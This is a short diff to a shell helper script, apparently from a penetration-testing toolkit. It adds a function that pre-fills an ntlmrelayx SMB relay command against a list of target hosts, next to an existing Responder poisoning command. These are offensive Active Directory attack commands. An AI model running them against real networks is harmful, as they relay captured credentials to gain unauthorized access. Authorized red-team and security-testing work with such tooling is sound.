@@ -40,6 +40,13 @@ nb-ad-smb-relay-responder() {
   print -z "sudo responder -I ${__IFACE} dwPv | tee -a $(domadpath)/responder-smb-relay.txt"
 }
 
+nb-ad-smb-relay-ntlmrelay() {
+	__ask "Enter a targets list file"
+	local targets && __askvar targets TARGETS
+
+  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee -a $(domadpath)/ntlmrelayx.txt"
+}
+
 nb-ad-smb-relay-ntlmrelay-shell() {
 	__ask "Enter a targets list file"
 	local targets && __askvar targets TARGETS
